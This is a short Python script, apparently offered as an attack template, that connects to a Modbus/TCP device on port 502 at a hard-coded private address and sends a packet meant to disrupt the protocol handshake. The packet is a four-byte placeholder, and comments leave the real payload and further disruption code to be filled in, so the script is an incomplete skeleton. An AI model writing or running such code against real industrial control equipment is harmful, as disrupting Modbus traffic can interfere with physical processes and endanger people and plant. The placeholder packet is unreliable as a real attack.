import socket

target_ip = "172.16.2.77"  # Replace with the target IP address
target_port = 502         # Replace with the target port number

def disrupt_modbus_handshake():
    # Create a TCP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connect to the target IP and port
        sock.connect((target_ip, target_port))

        # Send a crafted packet to disrupt the handshake
        packet = b"\x00\x00\x00\x00"  # Replace with the crafted packet
        sock.sendall(packet)

        # Add any additional code for disrupting the handshake here

    finally:
        # Close the socket connection
        sock.close()

# Call the function to disrupt the handshake
disrupt_modbus_handshake()
